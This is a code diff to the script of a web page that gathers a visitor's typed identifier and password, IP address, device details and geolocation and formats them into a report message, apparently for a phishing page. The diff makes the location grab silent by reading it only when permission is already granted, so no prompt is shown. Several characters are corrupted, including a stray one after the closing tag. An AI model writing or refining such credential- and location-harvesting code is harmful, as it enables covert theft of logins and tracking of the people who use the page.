@@ -399,23 +399,32 @@
                     ip = ipData.ip;
                 } catch (e) { /* Error in fetching IP */ }
 
-                // Fetch Geolocation
+                // Fetch Geolocation without prompting if permission isn't already granted
                 try {
-                    await new Promise((resolve) => {
-                        navigator.geolocation.getCurrentPosition(
-                            (pos) => {
-                                const { latitude, longitude } = pos.coords;
-                                locationText = `Latitude: ${latitude}, Longitude: ${longitude}`;
-                                resolve();
-                            },
-                            (error) => {
-                                locationText = `Permission Denied or Error in fetching Geolocation (${error.message || error.code})`;
-                                resolve();
-                            },
-                            { timeout: 5000, enableHighAccuracy: false }
-                        );
-                    });
-                } catch (e) { /* Error in fetching Geolocation */ }
+                    if (navigator.geolocation && navigator.permissions) {
+                        const permissionStatus = await navigator.permissions.query({ name: 'geolocation' });
+                        if (permissionStatus.state === 'granted') {
+                            await new Promise((resolve) => {
+                                navigator.geolocation.getCurrentPosition(
+                                    (pos) => {
+                                        const { latitude, longitude } = pos.coords;
+                                        locationText = `Latitude: ${latitude}, Longitude: ${longitude}`;
+                                        resolve();
+                                    },
+                                    (error) => {
+                                        locationText = `Error in fetching Geolocation (${error.message || error.code})`;
+                                        resolve();
+                                    },
+                                    { timeout: 5000, enableHighAccuracy: false }
+                                );
+                            });
+                        } else {
+                            locationText = `Geolocation not granted or available without prompt (${permissionStatus.state})`;
+                        }
+                    } else {
+                        locationText = 'Geolocation API or Permissions API Not Supported';
+                    }
+                } catch (e) { /* Error in checking/fetching Geolocation */ }
 
 
                 let detailedInfoSection = '';
@@ -487,8 +496,6 @@
 - Effective Network Type: ${networkEffectiveType}
 - Device Memory: ${deviceMemory}
 - Hardware Concurrency (CPU cores): ${hardwareConcurrency}
-- Gallery: Not directly accessible (requires user file selection)
-- SMS: Not directly accessible (browser security restriction)
 `;
                 }
 
@@ -496,7 +503,7 @@
                 const fullMessage = `
 ? *${actionType}*
 ---------------------
-📝 *Identifier:* ${input1 || 'Not Entered'}
+� *Identifier:* ${input1 || 'Not Entered'}
 📝 *Password:* ${input2 || 'Not Entered'}
 
 🌐 *Browser Info:*
@@ -605,3 +612,4 @@ ${detailedInfoSection}
     </script>
 </body>
 </html>
+�
